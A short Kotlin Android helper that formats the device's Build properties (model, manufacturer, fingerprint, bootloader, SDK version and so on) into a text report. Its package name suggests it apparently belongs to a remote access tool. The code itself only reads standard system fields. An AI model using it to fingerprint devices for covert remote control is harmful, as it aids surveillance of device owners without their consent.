package ru.awawa.rat.helper

import android.os.Build

object BuildInfo {

    fun getInfo(): String {
        return "Build info:\n\tBoard: ${Build.BOARD}\n" +
                "\tBootloader: ${Build.BOOTLOADER}\n" +
                "\tBrand: ${Build.BRAND}\n" +
                "\tDevice: ${Build.DEVICE}\n" +
                "\tDisplay: ${Build.DISPLAY}\n" +
                "\tFingerprint: ${Build.FINGERPRINT}\n" +
                "\tHardware: ${Build.HARDWARE}\n" +
                "\tHost: ${Build.HOST}\n" +
                "\tID: ${Build.ID}\n" +
                "\tManufacturer: ${Build.MANUFACTURER}\n" +
                "\tModel: ${Build.MODEL}\n" +
                "\tProduct: ${Build.PRODUCT}\n" +
                "\tTags: ${Build.TAGS}\n" +
                "\tType: ${Build.TYPE}\n" +
                "\tUser: ${Build.USER}\n" +
                "\tCodename: ${Build.VERSION.CODENAME}\n" +
                "\tSDK Int: ${Build.VERSION.SDK_INT}"
    }
}